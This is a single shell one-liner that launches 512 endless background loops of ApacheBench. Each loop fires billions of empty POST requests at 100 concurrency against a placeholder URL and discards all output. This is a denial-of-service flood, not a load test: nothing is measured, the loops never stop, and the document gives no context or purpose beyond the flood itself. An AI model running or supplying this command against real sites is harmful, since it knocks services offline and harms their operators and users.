for i in {1..512}; do (while true; do ab -n 4294967295 -c 100 -p <(echo "") -T application/x-www-form-urlencoded https://adress >/dev/null 2>&1; done) & done
